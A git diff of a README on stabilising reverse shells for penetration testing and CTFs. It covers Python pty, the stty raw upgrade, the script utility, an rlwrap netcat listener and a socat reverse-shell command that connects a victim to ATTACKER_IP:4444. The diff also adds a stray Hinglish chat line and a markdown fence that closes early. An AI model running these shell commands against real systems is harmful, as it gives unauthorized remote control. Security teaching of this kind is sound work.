@@ -1,3 +1,6 @@
+README.md ke liye ye professional version use kar sakte ho:
+
+````markdown
 # Stabilise The Reverse Shell
 
 A collection of techniques to upgrade a basic reverse shell into a fully interactive TTY shell during penetration testing and CTF environments.
@@ -21,6 +24,11 @@ Stabilising the shell provides a more interactive and reliable terminal experien
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+````
+
+Spawns a pseudo-terminal using Python.
+
+---
 
 ## Method 2 - Full TTY Upgrade
 
@@ -34,13 +42,86 @@ export TERM=xterm-256color
 
 Steps:
 
-- Spawn a PTY shell.
-- Background the session using CTRL + Z.
-- Configure local terminal with stty raw -echo.
-- Bring the shell back using fg.
-- Set terminal type.
+1. Spawn a PTY shell.
+2. Background the session using `CTRL + Z`.
+3. Configure local terminal with `stty raw -echo`.
+4. Bring the shell back using `fg`.
+5. Set terminal type.
 
 This method provides a near fully interactive shell.
 
+---
 
+## Method 3 - Script Utility
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+Uses the Linux `script` utility to create a pseudo-terminal.
+
+---
+
+## Method 4 - Socat Shell
+
+### Listener
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+### Victim
+
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
+```
+
+Replace:
+
+```text
+ATTACKER_IP
+```
+
+with your listener IP address.
+
+Socat provides one of the most stable reverse shells available.
+
+---
+
+## Method 5 - RLWrap
+
+```bash
+rlwrap -f . -r nc -nvlp 4444
+```
+
+Adds:
+
+* Command history
+* Better terminal interaction
+* Improved shell usability
+
+when working with Netcat listeners.
+
+---
+
+## References
+
+* Python PTY
+* Socat
+* Netcat
+* RLWrap
+* Linux TTY Management
+
+---
+
+## Disclaimer
+
+This repository is intended for:
+
+* Authorized penetration testing
+* Security research
+* Capture The Flag (CTF) challenges
+* Educational purposes
+
+Use only on systems you own or have explicit permission to test.
 
